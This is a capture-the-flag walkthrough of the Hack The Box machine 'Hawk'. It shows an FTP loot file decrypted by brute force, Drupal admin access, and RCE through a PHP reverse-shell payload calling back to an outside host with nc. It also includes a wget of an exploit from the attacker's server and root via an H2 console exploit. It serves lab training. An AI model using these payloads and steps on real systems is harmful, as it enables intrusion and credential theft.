# [Hawk](https://app.hackthebox.com/machines/Hawk)

```bash
nmap -p- --min-rate 10000  10.10.10.102 -Pn
```

![Alt text](img/image.png)

After knowing open ports(21,22,80,5435,8082,9092), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p21,22,80,5435,8082,9092 10.10.10.102 -Pn
```

![Alt text](img/image-1.png)


Let's start from FTP(port 21) that we find which we can login via '**anonymous**' user.

![Alt text](img/image-2.png)



Let's try to analyze the file which we find from FTP.

```bash
file .drupal.txt.enc
```

![Alt text](img/image-3.png)


Let's first `base64` decoding.

```bash
base64 -d .drupal.txt.enc > drupal_ssl
file drupal_ssl
```

![Alt text](img/image-4.png)


I just make brute-force to decrypt this file. For this I find such [tool](https://github.com/glv2/bruteforce-salted-openssl) on Github.


Note: This tool is also available on Kali (as built-in). 

Here,we do brute-force attack to decrypt this file by using tool called `bruteforce-salted-openssl`

```bash
bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt drupal_ssl -c aes-256-cbc -d sha256
```

![Alt text](img/image-5.png)

We find password that is '**friends**',

As we know password, we can decrypt this via `openssl` command.

```bash
openssl enc -d -aes256 -md sha256 -salt -in drupal_ssl -out drupal_decrypted -k friends
```

![Alt text](img/image-6.png)


Now, we know password of 'admin' user for service on port 80.

admin: PencilKeyboardScanner123

We can login via above credentials.

![Alt text](img/image-7.png)


First, we need to add 'PHP Code' filter from 'Modules' section of application.

![Alt text](img/image-8.png)


Then, we just click 'Add Content' -> 'Basic Page', we can enter malicious PHP code to get RCE.

```bash
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1337 >/tmp/f'); ?>
```

![Alt text](img/image-9.png)

I got reverse shell.

![Alt text](img/image-10.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-11.png)


user.txt

![Alt text](img/image-12.png)

While enumerating machine, I find file '/var/www/html/sites/default/settings.php' that contains sensitive information.

![Alt text](img/image-13.png)


That's password of 'daniel' user.

![Alt text](img/image-14.png)

daniel: drupal4hawk


But, there's something that I have Python shell while logging via 'daniel' user.

I just see why it is happens from '/etc/passwd' file.

![Alt text](img/image-15.png)


To get normal interactive shell, just did below.

```bash
import os
os.system("/bin/bash")

```

![Alt text](img/image-16.png)


If we pay attention to our nmap scan, we saw that there is database running for port (**8082**)

That is **'H2 database http console'**

Let's search publicly known exploit.

![Alt text](img/image-17.png)


Let's upload this malicious script into target machine by opening http server.

```bash
python3 -m http.server --bind 10.10.14.9 8080
```

![Alt text](img/image-18.png)

Let's download into target machine.

```bash
wget http://10.10.14.9:8080/45506.py
```

![Alt text](img/image-19.png)


Let's change privileges of this file and execute.

```bash
chmod 777 45506.py
python3 45506.py -H 127.0.0.1:8082
```

root.txt

![Alt text](img/image-20.png)